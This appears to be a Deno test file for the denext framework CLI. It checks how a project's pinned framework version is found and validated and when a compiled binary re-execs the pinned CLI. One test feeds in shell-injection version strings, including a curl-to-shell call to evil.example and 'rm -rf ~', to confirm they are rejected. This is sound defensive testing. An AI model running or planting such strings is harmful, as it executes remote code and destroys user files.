// A compiled binary carries one framework version; a project pins its own. These cover the
// pieces that decide which one runs: reading a project's pin the way `deno run` would resolve
// it, comparing it to a concrete version without tripping over the range operator a scaffolded
// project writes, and the re-exec decision itself, driven through its process seams.

import { assert, assertEquals, assertStringIncludes } from "@std/assert";
import { join } from "@std/path";
import {
  configArgsFor,
  discoveredConfig,
  maybeReexecPinned,
  mergeRunFlags,
  nearestConfig,
  parseRunCommandLine,
  pinnedConfigArgs,
  pinnedDenextCli,
  pinnedVersion,
  type ReexecPinnedDeps,
  samePin,
  toolchainConfigArgs,
} from "../src/cli/self-exec.ts";
import { buildRegistry } from "../src/cli/register.ts";

/** A throwaway project directory, optionally carrying `deno.json` with `source`. */
async function project(source: string | null): Promise<string> {
  const dir = await Deno.makeTempDir({ prefix: "denext_pin_" });
  if (source !== null) await Deno.writeTextFile(join(dir, "deno.json"), source);
  return dir;
}

/** `pinnedDenextCli` against one config, then the directory is removed. */
async function pinOf(source: string | null): Promise<string | null> {
  const dir = await project(source);
  try {
    return pinnedDenextCli(dir);
  } finally {
    await Deno.remove(dir, { recursive: true });
  }
}

/** Write `files` (relative path → content) under a fresh temp dir; returns its path. */
async function tree(files: Record<string, string>): Promise<string> {
  const root = await Deno.makeTempDir({ prefix: "denext_ws_" });
  for (const [rel, content] of Object.entries(files)) {
    const path = join(root, rel);
    await Deno.mkdir(join(path, ".."), { recursive: true });
    await Deno.writeTextFile(path, content);
  }
  return root;
}

Deno.test("pinnedDenextCli reads the project's denext pin, range operator included", async () => {
  // What `denext create` writes.
  assertEquals(
    await pinOf('{"imports":{"denext":"jsr:@denext/denext@^2.5.0-rc.6"}}'),
    "jsr:@denext/denext@^2.5.0-rc.6/cli",
    "the range is passed through, so the child resolves what the project asked for",
  );
  assertEquals(
    await pinOf('{"imports":{"denext":"jsr:@denext/denext@2.4.3"}}'),
    "jsr:@denext/denext@2.4.3/cli",
  );
});

Deno.test("a pin whose version is not a plain semver range is not a pin (it reaches shell commands)", async () => {
  const warn = console.warn;
  console.warn = () => {};
  try {
    for (
      const version of [
        "^3.0.0;curl evil.example|sh",
        "3.0.0 && rm -rf ~",
        "$(id)",
        "3.0.0`id`",
        "'3.0.0'",
      ]
    ) {
      assertEquals(
        await pinOf(JSON.stringify({ imports: { denext: `jsr:@denext/denext@${version}` } })),
        null,
        version,
      );
      assertEquals(pinnedVersion(`jsr:@denext/denext@${version}/cli`), null, version);
    }
  } finally {
    console.warn = warn;
  }
  // Every ordinary pin still is one.
  for (const version of ["^3.1.0", "~3.1", "3.1.0-rc.1", "*", "3", ">=3.0.0"]) {
    assertEquals(
      await pinOf(JSON.stringify({ imports: { denext: `jsr:@denext/denext@${version}` } })),
      `jsr:@denext/denext@${version}/cli`,
    );
  }
});

Deno.test("a directory that pins no denext defers to nothing", async () => {
  assertEquals(await pinOf('{"imports":{"@std/path":"jsr:@std/path@^1"}}'), null);
  assertEquals(await pinOf(null), null, "no config at all");
  assertEquals(await pinOf("{ not json"), null, "a malformed config pins nothing to trust");
  assertEquals(await pinOf("[1, 2]"), null, "a config that is not an object pins nothing");
  assertEquals(
    await pinOf('{"imports":{"denext":"../../mod.ts"}}'),
    null,
    "a local path is not a version this CLI can re-exec",
  );
  assertEquals(
    await pinOf('{"imports":{"denext":"jsr:@denext/denext-foo@1.0.0"}}'),
    null,
    "another package that merely starts with the name",
  );
});

Deno.test("deno.jsonc is read when there is no deno.json", async () => {
  const dir = await Deno.makeTempDir({ prefix: "denext_pin_" });
  try {
    await Deno.writeTextFile(
      join(dir, "deno.jsonc"),
      '{"imports":{"denext":"jsr:@denext/denext@2.4.3"}}',
    );
    assertEquals(pinnedDenextCli(dir), "jsr:@denext/denext@2.4.3/cli");
  } finally {
    await Deno.remove(dir, { recursive: true });
  }
});

Deno.test("comments and trailing commas are read as Deno reads them, in either file", async () => {
  // A hand-edited config is jsonc whatever its extension: Deno accepts both, so treating
  // either as "malformed" would make a binary refuse to build a project `deno task build` builds.
  const source = `{
  // the framework
  "imports": {
    "denext": "jsr:@denext/denext@^2.5.0", // pinned by \`denext create\`
  },
}`;
  assertEquals(await pinOf(source), "jsr:@denext/denext@^2.5.0/cli", "deno.json");
  const dir = await Deno.makeTempDir({ prefix: "denext_pin_" });
  try {
    await Deno.writeTextFile(join(dir, "deno.jsonc"), source);
    assertEquals(pinnedDenextCli(dir), "jsr:@denext/denext@^2.5.0/cli", "deno.jsonc");
  } finally {
    await Deno.remove(dir, { recursive: true });
  }
});

Deno.test("the pin is found under any key a project maps denext with", async () => {
  assertEquals(
    await pinOf('{"imports":{"denext/":"jsr:@denext/denext@^2.5.0/"}}'),
    "jsr:@denext/denext@^2.5.0/cli",
    "a trailing-slash (directory) mapping",
  );
  assertEquals(
    await pinOf('{"imports":{"@denext/denext":"jsr:@denext/denext@2.4.3"}}'),
    "jsr:@denext/denext@2.4.3/cli",
    "the package's own name",
  );
});

Deno.test("an unversioned jsr:@denext/denext pins the latest published version", async () => {
  // What the docs show for `deno run -A jsr:@denext/denext/cli`: `deno run` resolves it to
  // the newest version, so the binary defers to that rather than deciding nothing is pinned
  // and refusing — the child's framework is still the one the project would build with.
  assertEquals(
    await pinOf('{"imports":{"denext":"jsr:@denext/denext"}}'),
    "jsr:@denext/denext/cli",
  );
  assertEquals(
    await pinOf('{"imports":{"denext/":"jsr:@denext/denext/"}}'),
    "jsr:@denext/denext/cli",
  );
  assertEquals(pinnedVersion("jsr:@denext/denext/cli"), null);
  assertEquals(pinnedVersion("jsr:@denext/denext@^2.5.0/cli"), "^2.5.0");
  assertEquals(pinnedVersion("jsr:@denext/denext@2.4.3"), "2.4.3");
  assertEquals(pinnedVersion("npm:react"), null);
  assertEquals(
    samePin("jsr:@denext/denext/cli", "2.5.0"),
    false,
    "what latest is cannot be known here, so it never counts as this version",
  );
});

Deno.test("a config's importMap file is followed", async () => {
  const root = await tree({
    "deno.json": '{"importMap": "./import_map.json"}',
    "import_map.json": '{"imports": {"denext": "jsr:@denext/denext@2.4.3"}}',
  });
  try {
    assertEquals(pinnedDenextCli(root), "jsr:@denext/denext@2.4.3/cli");
    await Deno.writeTextFile(join(root, "import_map.json"), "{ nope");
    assertEquals(pinnedDenextCli(root), null, "a malformed import map pins nothing");
    await Deno.remove(join(root, "import_map.json"));
    assertEquals(pinnedDenextCli(root), null, "a missing import map pins nothing");
  } finally {
    await Deno.remove(root, { recursive: true });
  }
});

Deno.test("a workspace member inherits the pin of the root that lists it", async () => {
  const root = await tree({
    "deno.json": '{"workspace": ["./apps/web", "packages/*"], ' +
      '"imports": {"denext": "jsr:@denext/denext@^2.5.0"}}',
    "apps/web/deno.json": '{"name": "@acme/web"}',
    "packages/ui/deno.jsonc": "{ /* a member */ }",
    "packages/ui/nested/deno.json": "{}",
    "other/deno.json": "{}",
  });
  try {
    assertEquals(
      pinnedDenextCli(join(root, "apps/web")),
      "jsr:@denext/denext@^2.5.0/cli",
      "listed explicitly",
    );
    assertEquals(
      pinnedDenextCli(join(root, "packages/ui")),
      "jsr:@denext/denext@^2.5.0/cli",
      "listed by a glob",
    );
    assertEquals(
      pinnedDenextCli(join(root, "packages/ui/nested")),
      null,
      "one segment only: a directory under a glob member is not itself a member",
    );
    assertEquals(
      pinnedDenextCli(join(root, "other")),
      null,
      "a root that does not list the directory is not its root",
    );
    // A member's own pin wins over the root's.
    await Deno.writeTextFile(
      join(root, "apps/web/deno.json"),
      '{"imports": {"denext": "jsr:@denext/denext@2.4.3"}}',
    );
    assertEquals(pinnedDenextCli(join(root, "apps/web")), "jsr:@denext/denext@2.4.3/cli");
  } finally {
    await Deno.remove(root, { recursive: true });
  }
});

Deno.test("the workspace walk understands { members } and stops at a .git directory", async () => {
  const root = await tree({
    "deno.json": '{"workspace": {"members": ["./repo/app"]}, ' +
      '"imports": {"denext": "jsr:@denext/denext@^2.5.0"}}',
    "repo/app/deno.json": "{}",
  });
  try {
    assertEquals(pinnedDenextCli(join(root, "repo/app")), "jsr:@denext/denext@^2.5.0/cli");
    // Make `repo` a repository: nothing above a checkout is that checkout's workspace.
    await Deno.mkdir(join(root, "repo/.git"));
    assertEquals(pinnedDenextCli(join(root, "repo/app")), null);
    // A worktree's `.git` is a file; it bounds the walk just the same.
    await Deno.remove(join(root, "repo/.git"));
    await Deno.writeTextFile(join(root, "repo/.git"), "gitdir: /elsewhere");
    assertEquals(pinnedDenextCli(join(root, "repo/app")), null);
  } finally {
    await Deno.remove(root, { recursive: true });
  }
});

Deno.test("samePin ignores the range operator, so a binary does not re-exec itself", () => {
  // The bug this exists for: a scaffolded project pins `^X`, the binary is `X`, and comparing
  // the raw specifiers would defer to a child for the very version already running.
  assertEquals(samePin("jsr:@denext/denext@^2.5.0-rc.6/cli", "2.5.0-rc.6"), true);
  assertEquals(samePin("jsr:@denext/denext@~2.5.0/cli", "2.5.0"), true);
  assertEquals(samePin("jsr:@denext/denext@>=2.5.0/cli", "2.5.0"), true);
  assertEquals(samePin("jsr:@denext/denext@2.5.0-rc.6/cli", "2.5.0-rc.6"), true);
  assertEquals(samePin("jsr:@denext/denext@2.4.3/cli", "2.5.0-rc.6"), false);
  assertEquals(samePin("not a specifier", "2.5.0-rc.6"), false);
});

/** What one `maybeReexecPinned` run did to its seams. */
interface Trace {
  spawned: string[];
  exited: number[];
  warned: string[];
}

/**
 * Drive the decision with every process seam stubbed: `standalone` and `env` as given, a
 * `spawn` that records the CLI it was handed and returns `childCode`.
 */
async function decide(
  dir: string,
  opts: { standalone: boolean; env?: Record<string, string>; childCode?: number },
): Promise<Trace & { stopped: boolean }> {
  const trace: Trace = { spawned: [], exited: [], warned: [] };
  const deps: ReexecPinnedDeps = {
    standalone: () => opts.standalone,
    env: (name) => opts.env?.[name],
    spawn: (cli) => {
      trace.spawned.push(cli);
      return Promise.resolve(opts.childCode ?? 0);
    },
    exit: (code) => {
      trace.exited.push(code);
    },
    warn: (message) => {
      trace.warned.push(message);
    },
  };
  const stopped = await maybeReexecPinned(dir, "2.5.0", ["build", "."], deps);
  return { ...trace, stopped };
}

Deno.test("only a compiled binary defers, and never inside the child it spawned", async () => {
  const dir = await project('{"imports":{"denext":"jsr:@denext/denext@2.4.3"}}');
  try {
    const plain = await decide(dir, { standalone: false });
    assertEquals(
      plain.stopped,
      false,
      "under `deno run` the CLI is the framework: nothing to defer to",
    );
    assertEquals(plain.spawned, []);
    assertEquals(plain.exited, []);
    // The pinned child runs under `deno run` (not a binary) but may re-exec again for CSS or
    // modules; the env guard is the loop-breaker, and it must hold even when a pin differs.
    const guarded = await decide(dir, { standalone: true, env: { DENEXT_PINNED_ACTIVE: "1" } });
    assertEquals(guarded.stopped, false);
    assertEquals(guarded.spawned, []);
  } finally {
    await Deno.remove(dir, { recursive: true });
  }
});

Deno.test("a binary refuses a directory that pins no denext, with the command to run instead", async () => {
  const dir = await project('{"imports":{"@std/path":"jsr:@std/path@^1"}}');
  try {
    const refused = await decide(dir, { standalone: true });
    assertEquals(refused.stopped, true);
    assertEquals(refused.spawned, [], "nothing is built with the binary's own framework");
    assertEquals(refused.exited, [1]);
    assertEquals(refused.warned.length, 1);
    assertStringIncludes(refused.warned[0], "pins no denext");
    assertStringIncludes(
      refused.warned[0],
      "deno run -A jsr:@denext/denext@2.5.0/cli build .",
      "the suggested command names the binary's version and repeats the argv",
    );
  } finally {
    await Deno.remove(dir, { recursive: true });
  }
});

Deno.test("a binary re-execs the pinned CLI and exits with the child's code", async () => {
  const dir = await project('{"imports":{"denext":"jsr:@denext/denext@2.4.3"}}');
  try {
    const other = await decide(dir, { standalone: true, childCode: 3 });
    assertEquals(other.stopped, true);
    assertEquals(other.spawned, ["jsr:@denext/denext@2.4.3/cli"]);
    assertEquals(other.exited, [3], "the child's exit code is the process's");
    assertEquals(other.warned, ["denext: using this project's pinned denext (2.4.3)"]);
    // A signal death is reported the way a shell reports it (128 + signal, here SIGTERM).
    assertEquals((await decide(dir, { standalone: true, childCode: 143 })).exited, [143]);

    // The binary's own version (as a range, which is what a scaffold writes) still defers —
    // a binary cannot bundle in-process — but says nothing about it.
    await Deno.writeTextFile(
      join(dir, "deno.json"),
      '{"imports":{"denext":"jsr:@denext/denext@^2.5.0"}}',
    );
    const same = await decide(dir, { standalone: true });
    assertEquals(same.spawned, ["jsr:@denext/denext@^2.5.0/cli"]);
    assertEquals(same.warned, [], "switching to the version already running is not news");

    await Deno.writeTextFile(join(dir, "deno.json"), '{"imports":{"denext":"jsr:@denext/denext"}}');
    const latest = await decide(dir, { standalone: true });
    assertEquals(latest.spawned, ["jsr:@denext/denext/cli"]);
    assertEquals(latest.warned, ["denext: using this project's pinned denext (latest)"]);
  } finally {
    await Deno.remove(dir, { recursive: true });
  }
});

Deno.test("the verbs a binary defers are exactly the module-loading ones", () => {
  // `moduleGate` in cli.ts applies the re-exec to `loadsModules` verbs only; this pins which
  // those are, so a verb that starts loading a project's modules has to declare it here too.
  const verbs = buildRegistry().list();
  const deferred = verbs.filter((c) => c.loadsModules).map((c) => c.name).sort();
  for (const name of ["dev", "build", "export", "start", "job", "doctor", "analyze", "profile"]) {
    assert(deferred.includes(name), `${name} loads the project's modules`);
  }
  for (const name of ["ui", "create", "init", "completions", "commands", "mcp", "fmt", "lint"]) {
    assert(!deferred.includes(name), `${name} never loads the project's modules in-process`);
  }
});

Deno.test("parseRunCommandLine: config, --no-config, the script and the resolution flags", () => {
  const line = (...a: string[]) => parseRunCommandLine(["deno", "run", ...a]);
  assertEquals(line("-A", "--config", "x.json", "cli.ts").config, "x.json");
  assertEquals(line("-c", "y.json", "cli.ts").script, "cli.ts");
  assertEquals(line("--config=z.json", "cli.ts", "dev").config, "z.json");
  assert(line("-A", "--no-config", "jsr:@denext/denext/cli").noConfig);
  // After the script, flags belong to the program, not to Deno.
  const after = line("-A", "cli.ts", "--config", "a.json", "--lock=b");
  assertEquals([after.config, after.script, after.resolution], [undefined, "cli.ts", []]);
  assertEquals(parseRunCommandLine(["deno", "eval", "--config", "b.json"]).config, undefined);
  const flags = line(
    "-A",
    "--lock",
    "my.lock",
    "--node-modules-dir=none",
    "--import-map",
    "im.json",
    "--min-dep-age=0",
    "--frozen",
    "--no-npm",
    "--location",
    "https://x.test",
    "--reload",
    "jsr:@denext/denext@4.0.0/cli",
    "build",
  );
  assertEquals(flags.resolution, [
    "--lock",
    "my.lock",
    "--node-modules-dir=none",
    "--import-map",
    "im.json",
    "--min-dep-age=0",
    "--frozen",
    "--no-npm",
  ]);
  assertEquals(flags.script, "jsr:@denext/denext@4.0.0/cli", "a separate value is not the script");
  // A bare `--lock` before another flag takes no value.
  assertEquals(line("--lock", "-A", "c.ts").resolution, ["--lock"]);
});

Deno.test("discoveredConfig follows Deno's discovery: script dir, cwd for jsr:/npm:, none remote", async () => {
  const root = await tree({
    "app/deno.json": "{}",
    "app/src/x.ts": "",
    "tool/deno.jsonc": "{}",
    "tool/cli.ts": "",
    "ws/deno.json": '{ "workspace": ["./web"] }',
    "ws/web/deno.json": "{}",
    "bare/x.ts": "",
  });
  try {
    const app = join(root, "app");
    const tool = join(root, "tool");
    assertEquals(nearestConfig(join(app, "src")), join(app, "deno.json"));
    assertEquals(nearestConfig(join(root, "bare")), null);
    assertEquals(nearestConfig(join(root, "ws", "web")), join(root, "ws", "web", "deno.json"));
    assertEquals(discoveredConfig("jsr:@denext/denext@4.0.0/cli", app), join(app, "deno.json"));
    assertEquals(discoveredConfig("npm:x", join(app, "src")), join(app, "deno.json"));
    assertEquals(discoveredConfig("https://jsr.io/@denext/denext/4.0.0/cli.ts", app), null);
    // A local script: beside the script, wherever the working directory is.
    assertEquals(discoveredConfig(join(tool, "cli.ts"), app), join(tool, "deno.jsonc"));
    assertEquals(discoveredConfig("../tool/cli.ts", app), join(tool, "deno.jsonc"));
    assertEquals(discoveredConfig(`file://${join(tool, "cli.ts")}`, app), join(tool, "deno.jsonc"));
  } finally {
    await Deno.remove(root, { recursive: true });
  }
});

Deno.test("configArgsFor: nothing when the child finds the same file, else --config / --no-config", async () => {
  const root = await tree({ "app/deno.json": "{}", "tool/deno.json": "{}", "tool/cli.ts": "" });
  try {
    const app = join(root, "app");
    const cfg = join(app, "deno.json");
    const url = "https://jsr.io/@denext/denext/4.0.0/cli.ts";
    assertEquals(configArgsFor(cfg, url, app), ["--config", cfg], "a remote child finds none");
    assertEquals(configArgsFor(cfg, "jsr:@denext/denext/cli", app), []);
    assertEquals(configArgsFor(cfg, "jsr:@denext/denext/cli", root), ["--config", cfg]);
    assertEquals(configArgsFor(null, url, app), []);
    assertEquals(configArgsFor(null, "jsr:@denext/denext/cli", app), ["--no-config"]);
    assertEquals(configArgsFor(null, join(root, "tool", "cli.ts"), app), ["--no-config"]);
  } finally {
    await Deno.remove(root, { recursive: true });
  }
});

Deno.test("toolchainConfigArgs: the toolchain child resolves the config its parent resolved", async () => {
  const root = await tree({
    "app/deno.json": '{ "imports": { "@denext/backend": "jsr:@denext/backend@^0.1.0" } }',
    "app/src/x.ts": "",
    "app/alt.json": "{}",
    "ws/deno.json": '{ "workspace": ["./web"] }',
    "ws/web/deno.json": "{}",
    "repo/deno.json": "{}",
    "repo/cli.ts": "",
  });
  const argv = (...a: string[]) => () => Promise.resolve(["/bin/deno", "run", ...a]);
  const url = "https://jsr.io/@denext/denext/4.0.0/cli.ts";
  const jsr = "jsr:@denext/denext@4.0.0/cli";
  try {
    const app = join(root, "app");
    const cfg = join(app, "deno.json");
    // The reported bug: `deno task build` runs `deno run -A jsr:…/cli build` in the project; the
    // parent discovers deno.json from the working directory, the https child would find none.
    assertEquals(await toolchainConfigArgs(url, argv("-A", jsr, "build"), app), ["--config", cfg]);
    assertEquals(await toolchainConfigArgs(url, argv("-A", jsr), join(app, "src")), [
      "--config",
      cfg,
    ]);
    // An explicit config, relative to the working directory.
    assertEquals(await toolchainConfigArgs(url, argv("-c", "alt.json", jsr), app), [
      "--config",
      join(app, "alt.json"),
    ]);
    // --no-config stays none: a remote child discovers nothing anyway, a local one is told.
    assertEquals(await toolchainConfigArgs(url, argv("--no-config", jsr), app), []);
    const localCli = join(root, "repo", "cli.ts");
    assertEquals(await toolchainConfigArgs(localCli, argv("--no-config", localCli), app), [
      "--no-config",
    ]);
    // A local checkout's cli.ts: both processes discover the checkout's own config.
    assertEquals(await toolchainConfigArgs(localCli, argv("-A", localCli, "build"), app), []);
    // A workspace member: the member's file (Deno finds the root from it).
    const web = join(root, "ws", "web");
    assertEquals(await toolchainConfigArgs(url, argv("-A", jsr), web), [
      "--config",
      join(web, "deno.json"),
    ]);
    // The resolution flags come along, verbatim.
    assertEquals(
      await toolchainConfigArgs(url, argv("--lock=x.lock", "--node-modules-dir=auto", jsr), app),
      ["--config", cfg, "--lock=x.lock", "--node-modules-dir=auto"],
    );
    // An unreadable command line (Windows): a remote CLI is assumed started from jsr: here.
    const none = () => Promise.resolve(null);
    assertEquals(await toolchainConfigArgs(url, none, app), ["--config", cfg]);
    assertEquals(await toolchainConfigArgs(localCli, none, app), []);
    // The real reader works on this host (or reports nothing).
    assert(Array.isArray(await toolchainConfigArgs(url)));
  } finally {
    await Deno.remove(root, { recursive: true });
  }
});

Deno.test("mergeRunFlags: the parent's own resolution flags replace denext's defaults", () => {
  assertEquals(
    mergeRunFlags(["--node-modules-dir=none", "--min-dep-age=0"], ["--node-modules-dir=auto"]),
    ["--min-dep-age=0", "--node-modules-dir=auto"],
  );
  assertEquals(mergeRunFlags(["--min-dep-age=0"], ["--config", "/p/deno.json"]), [
    "--min-dep-age=0",
    "--config",
    "/p/deno.json",
  ]);
});

Deno.test("pinnedConfigArgs hands the pinned child the project's config only from outside it", async () => {
  // The child is `deno run jsr:@denext/denext@…/cli`, which discovers its config from the working
  // directory; from outside the project it would run with none, losing the project's import map
  // and its own `minimumDependencyAge` rule.
  const root = await tree({
    "app/deno.json": '{ "imports": { "denext": "jsr:@denext/denext@^4.0.0" } }',
    "app/src/x.ts": "",
    "bare/x.ts": "",
    "other/deno.json": "{}",
    "ws/deno.json": '{ "workspace": ["./web"] }',
    "ws/web/deno.json": "{}",
  });
  try {
    const app = join(root, "app");
    assertEquals(pinnedConfigArgs(app, root), ["--config", join(app, "deno.json")]);
    assertEquals(pinnedConfigArgs(app, app), [], "inside the project Deno finds it itself");
    assertEquals(pinnedConfigArgs(app, join(app, "src")), [], "below the project too");
    assertEquals(pinnedConfigArgs(join(root, "bare"), root), [], "no config, nothing to pass");
    // From inside another project the child would find THAT config; it is told the target's.
    assertEquals(pinnedConfigArgs(app, join(root, "other")), ["--config", join(app, "deno.json")]);
    assertEquals(pinnedConfigArgs(join(root, "bare"), join(root, "other")), ["--no-config"]);
    // A workspace member aimed at from the workspace root gets the member's own file.
    const web = join(root, "ws", "web");
    assertEquals(pinnedConfigArgs(web, join(root, "ws")), ["--config", join(web, "deno.json")]);
    assertEquals(pinnedConfigArgs(web, web), []);
  } finally {
    await Deno.remove(root, { recursive: true });
  }
});

Deno.test("pinnedDenextCli: an importMap outside the repository pins nothing", async () => {
  const base = await Deno.realPath(await Deno.makeTempDir({ prefix: "denext-pin-outside-" }));
  try {
    const repo = join(base, "repo");
    await Deno.mkdir(join(repo, ".git"), { recursive: true });
    await Deno.mkdir(join(repo, "apps", "web"), { recursive: true });
    const map = (version: string) =>
      JSON.stringify({ imports: { denext: `jsr:@denext/denext@${version}` } });
    await Deno.writeTextFile(join(base, "outside.json"), map("1.0.0"));
    // By a path out of it, by an absolute one, and through a link.
    for (const importMap of ["../outside.json", join(base, "outside.json"), "./link.json"]) {
      await Deno.remove(join(repo, "link.json")).catch(() => {});
      await Deno.symlink(join(base, "outside.json"), join(repo, "link.json"));
      await Deno.writeTextFile(join(repo, "deno.json"), JSON.stringify({ importMap }));
      assertEquals(pinnedDenextCli(repo), null, importMap);
    }
    // A member's map up in its own repository still counts, outside its own directory.
    await Deno.writeTextFile(join(repo, "map.json"), map("2.0.0"));
    await Deno.writeTextFile(
      join(repo, "apps", "web", "deno.json"),
      JSON.stringify({ importMap: "../../map.json" }),
    );
    assertEquals(pinnedDenextCli(join(repo, "apps", "web")), "jsr:@denext/denext@2.0.0/cli");
  } finally {
    await Deno.remove(base, { recursive: true });
  }
});

Deno.test({
  name: "pinnedDenextCli: a device or a FIFO named by a config never blocks the lookup",
  ignore: Deno.build.os === "windows",
  fn: async () => {
    const dir = await Deno.realPath(await Deno.makeTempDir({ prefix: "denext-pin-device-" }));
    try {
      await Deno.mkdir(join(dir, ".git"));
      // Both would block this process for good, so each runs in a child with a deadline.
      await new Deno.Command("mkfifo", { args: [join(dir, "fifo")] }).output();
      await Deno.symlink("/dev/zero", join(dir, "zero"));
      const moduleUrl = new URL("../src/cli/self-exec.ts", import.meta.url).href;
      for (const config of [{ importMap: "./fifo" }, { importMap: "./zero" }]) {
        await Deno.writeTextFile(join(dir, "deno.json"), JSON.stringify(config));
        const { code, stdout } = await new Deno.Command(Deno.execPath(), {
          args: [
            "eval",
            `const m = await import(${JSON.stringify(moduleUrl)});` +
            `console.log(m.pinnedDenextCli(${JSON.stringify(dir)}));`,
          ],
          stdin: "null",
          stdout: "piped",
          stderr: "null",
          signal: AbortSignal.timeout(30_000),
        }).output();
        assertEquals(code, 0, JSON.stringify(config));
        assertEquals(new TextDecoder().decode(stdout).trim(), "null");
      }
    } finally {
      await Deno.remove(dir, { recursive: true });
    }
  },
});
